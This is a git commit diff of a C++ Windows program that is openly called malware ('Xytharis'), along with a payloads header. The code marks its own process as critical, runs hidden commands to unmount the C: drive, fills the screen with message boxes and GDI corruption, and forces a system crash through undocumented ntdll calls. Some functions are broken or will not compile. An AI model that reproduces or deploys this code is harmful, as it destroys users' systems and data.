777ccae94d7019e5b2e7060a8e14ecff726ee1b2
kevlu8 <kevie.lu8@gmail.com>
2021-10-14 13:30:18 -0600

    Update clean

--- Clean/Code/XytharisClean/XytharisClean.cpp
+++ Clean/Code/XytharisClean/XytharisClean.cpp
@@ -1,152 +1,195 @@
-#ifndef UNICODE
-#define UNICODE
-#endif 
+//#pragma comment(lib, "Winmm.lib")
 
-#include <windows.h>
-#include <WinUser.h>
+#ifdef UNICODE
+#undef UNICODE
+#endif
+
 #include <iostream>
-#include <wingdi.h>
+#include <Windows.h>
 #include <math.h>
-#include <stdlib.h>
-#include <thread>
-#include <processthreadsapi.h>
-#include <tlhelp32.h>
+#include <random>
 
-typedef NTSTATUS(NTAPI* TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+#include "payloads.h"
 
-typedef NTSTATUS(NTAPI* TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
-    ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
+typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
+
+typedef int (*functionarray) ();
+
+DWORD WINAPI audio(LPVOID lpParam) {
+    while (true) {
+        Sleep(rand() % 10000);
+        Beep(rand() % 2000, rand() % 5000);
+    }
+    ExitThread(0);
+}
+
+/*DWORD WINAPI Music(LPVOID lpParam) {
+    mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
+    mciSendString("play mp3", NULL, 0, NULL);
+    MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MB_YESNO | MB_ICONEXCLAMATION);
+    mciSendString("stop mp3", NULL, 0, NULL);
+}*/
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
-
-    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
-
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
-    if (MessageBoxW(NULL, L"This program is a joke program that will not harm your computer, however it does contain flashing lights and will crash your system. Understanding this, have you saved all your files and are not sensitive to flashing lights?", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
+    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE YOUR COMPUTER IS GONE", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
     {
         ExitProcess(0);
     }
 
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    BOOL playmusic = TRUE;
 
-    MessageBoxW(NULL, L"Fatal error: Cannot found vcruntime140.dll. Click OK to terminate the program.", L"Fatal error in Xytharis.exe", MB_TOPMOST | MB_ICONSTOP);
+    functionarray payloads[] = {
+        leakram,
+        p1,
+        p2,
+        p3
+    }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
-    system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+    HMODULE ntdll = LoadLibraryA("ntdll.dll");
+    fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+    fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
+    
+    BOOLEAN bOld1;
+    ULONG ulBreakOnTermination1 = 1;
+    RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
+    NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
 
-    //eject C:
-    system("mountvol C: /d");
+    MSGBOXPARAMS msglol = { 0 };
+    msglol.cbSize = sizeof(MSGBOXPARAMS);
+    msglol.hwndOwner = NULL;
+    msglol.hInstance = GetModuleHandle(NULL);
+    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program.";
+    msglol.lpszCaption = "Fatal error in Xytharis.exe";
+    msglol.dwStyle = MB_OK | MB_ICONHAND;
+    HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);
 
-    DWORD dwVal = 1;
+    //rick roll
+    //ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);
 
-    HKEY hKey;
+    /*if (playmusic) {
+        HANDLE music = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Music, NULL, 0, NULL))
+    } //add music soon, get better method*/
 
-    //std::thread p1(monitor);
-    //std::thread p2(monitor);
+    HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
+
+    ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
+    ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
 
     Sleep(10000);
 
-    DWORD dwID2 = 0;
-    MSGBOXPARAMS msg2 = { 0 };
+    MSGBOXPARAMS msg2 = {0};
     msg2.cbSize = sizeof(MSGBOXPARAMS);
     msg2.hwndOwner = NULL;
     msg2.hInstance = GetModuleHandle(NULL);
-    msg2.lpszText = L"Your computer is now fucked!";
-    msg2.lpszCaption = L"Your computer is mine now";
+    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
+    msg2.lpszCaption = "Your computer is mine now";
     msg2.dwStyle = MB_OK | MB_ICONHAND;
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, 0, &dwID2);
+    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);
 
-    DWORD dwID1 = 0;
     MSGBOXPARAMS msg1 = { 0 };
     msg1.cbSize = sizeof(MSGBOXPARAMS);
     msg1.hwndOwner = NULL;
     msg1.hInstance = GetModuleHandle(NULL);
-    msg1.lpszText = L"Error in application \"svchost.exe\": terminating...";
-    msg1.lpszCaption = L"Error";
+    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
+    msg1.lpszCaption = "Error";
     msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);
+    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);
 
-    //memz final payload effect but random
-    for (int i = 1; i < 50; i++) {
+    //p1();
 
-        //msgbox spam
-        DWORD dwID = 0;
-        MSGBOXPARAMS msg = { 0 };
-        msg.cbSize = sizeof(MSGBOXPARAMS);
-        msg.hwndOwner = NULL;
-        msg.hInstance = GetModuleHandle(NULL);
-        msg.lpszText = L"bet you regret that now huh";
-        msg.lpszCaption = L"ez";
-        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
-
-
-        HWND desktop = GetDesktopWindow();
-        HDC desk = GetDC(NULL);
-        RECT rect;
-        GetWindowRect(desktop, &rect);
-        int w = rect.right - rect.left;
-        int h = rect.bottom - rect.top;
-        StretchBlt(desk, rand() % 100, rand() % 100, w - 100, h - 100, desk, 0, 0, w, h, SRCCOPY);
-        Sleep(300 - (4 * i));
-
-        HRGN hRegion1;
-        hRegion1 = CreateRectRgn(0, 0, w, h);
-        InvertRgn(desk, hRegion1);
-
-    }
+    p2();
 
     //i have no idea what this does
     HWND desktop = GetDesktopWindow();
     RECT rect;
     GetWindowRect(desktop, &rect);
-    int w = rect.right - rect.left;
-    int h = rect.bottom - rect.top;
+    INT w = rect.right - rect.left;
+    INT h = rect.bottom - rect.top;
     HDC desk = GetDC(NULL);
     PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);
 
+    INT sw = GetSystemMetrics(SM_CXSCREEN);
+    INT sh = GetSystemMetrics(SM_CYSCREEN);
+    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
 
+    fori(100) {
+        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
+        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
+    }
+    
+    // SetPixel is slow
     //random pixels all over the place
-    for (int i = 1; i < 200; i++) {
+    fori(100) {
         CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
         TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
         Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
         Sleep(50);
     }
 
-    MessageBoxW(NULL, L"that was only round 1, have a little brake", L"get ready", MB_OK | MB_ICONSTOP);
+    MSGBOXPARAMS msg5 = { 0 };
+    msg5.cbSize = sizeof(MSGBOXPARAMS);
+    msg5.hwndOwner = NULL;
+    msg5.hInstance = GetModuleHandle(NULL);
+    msg5.lpszText = "that was only round 1, have a little braek";
+    msg5.lpszCaption = "get ready";
+    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
+    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, NULL, NULL);
 
     Sleep(10000);
-
     Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
+    fori(50) {
+        INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
+        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
+        SelectObject(desk, brush);
+        BitBlt(desk, 0, y, 100, h, desk, rand() % 96 - 56, y, SRCCOPY);
+        PatBlt(desk, -1, y, 100, h, PATINVERT);
+        Sleep(rand() % 1234);
+    }
 
-    HRGN hRegion;
+    HRGN hRegion = CreateRectRgn(0, 0, w, h);
 
-    hRegion = CreateRectRgn(0, 0, w, h);
-
-    for (int i = 1; i < 100; i++) {
+    fori(50) {
         LineTo(desk, rand() % w, rand() % h);
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
         InvertRgn(desk, hRegion);
         Sleep(50);
     }
 
+    fori(1000) {
+        i += 5;
+        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
+    } 
 
-
-    //system("taskkill /f /im svchost.exe"); 
-    // ^ lmao that doesnt work mbecause there is no C:\
-
-    if (hNtdll != 0) { //crash system using undocumented methods
-        NTSTATUS s1, s2;
-        BOOLEAN b;
-        ULONG r;
-
-        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
-        s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
-
-        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
-        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
+    fori(50) {
+        
     }
+
+    ReleaseDC(NULL, desk);
+    CloseHandle(hmsg1);
+    CloseHandle(hmsg2);
+    CloseHandle(hmsg3);
+    CloseHandle(hmsg4);
+
+    TerminateThread(hAudio, 1); //literally not safe
+    CloseHandle(hAudio);
+
+    //crash
+    BOOLEAN bOld2;
+    ULONG ulResponse;
+    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
+    NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
+    FreeLibrary(ntdll);
     return 0;
 }
---
+++ Clean/Code/XytharisClean/payloads.h
@@ -0,0 +1,100 @@
+#pragma once
+#define fori(x) for (INT i = 0; i < x; i++)
+
+int p1() { //msgbox
+    MSGBOXPARAMS msg2 = { 0 };
+    msg2.cbSize = sizeof(MSGBOXPARAMS);
+    msg2.hwndOwner = NULL;
+    msg2.hInstance = GetModuleHandle(NULL);
+    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
+    msg2.lpszCaption = "Your computer is mine now";
+    msg2.dwStyle = MB_OK | MB_ICONHAND;
+    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);
+
+    MSGBOXPARAMS msg1 = { 0 };
+    msg1.cbSize = sizeof(MSGBOXPARAMS);
+    msg1.hwndOwner = NULL;
+    msg1.hInstance = GetModuleHandle(NULL);
+    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
+    msg1.lpszCaption = "Error";
+    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
+    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);
+
+    return 0;
+}
+
+int p2() { //memz final payload but random
+    fori(50) {
+
+        //msgbox spam
+        DWORD dwID = 0;
+        MSGBOXPARAMS msg = { 0 };
+        msg.cbSize = sizeof(MSGBOXPARAMS);
+        msg.hwndOwner = NULL;
+        msg.hInstance = GetModuleHandle(NULL);
+        msg.lpszText = "bet you regret that now huh";
+        msg.lpszCaption = "ez";
+        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
+
+
+        HWND desktop = GetDesktopWindow();
+        HDC desk = GetDC(NULL);
+        RECT rect;
+        GetWindowRect(desktop, &rect);
+        int w = rect.right - rect.left;
+        int h = rect.bottom - rect.top;
+        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
+        Sleep(300 - (4 * i));
+        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
+        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);
+
+        HRGN hRegion1;
+        hRegion1 = CreateRectRgn(0, 0, w, h);
+        InvertRgn(desk, hRegion1);
+
+        Beep(rand() % 30000, rand() % 1000);
+
+    }
+    return 0;
+}
+
+int p3() {
+    HWND desktop = GetDesktopWindow();
+    RECT rect;
+    GetWindowRect(desktop, &rect);
+    INT w = rect.right - rect.left;
+    INT h = rect.bottom - rect.top;
+    HDC desk = GetDC(NULL);
+    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);
+
+    INT sw = GetSystemMetrics(SM_CXSCREEN);
+    INT sh = GetSystemMetrics(SM_CYSCREEN);
+    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
+
+    for (INT index = 0; index < 100; index++) {
+        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
+        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
+    }
+
+    return 0;
+
+}
+
+int leakram() {
+    long long ramsize = 0;
+    char* array[] = { "A" }
+    GetPhysicallyInstalledSystemMemory((PULONGLONG)ramsize);
+    //ramsize = (long long)ramsize;
+    std::random_device rd;
+    std::default_random_engine generator(rd);
+    std::uniform_int_distribution<long long unsigned> distribution(0, ramsize);
+
+    char* array[] = {"A"};
+
+    while (true) {
+        Sleep(rand() % 5000);
+        ZeroMemory(&array[distribution(generator)], 1)
+    }
+    return 0;
+}
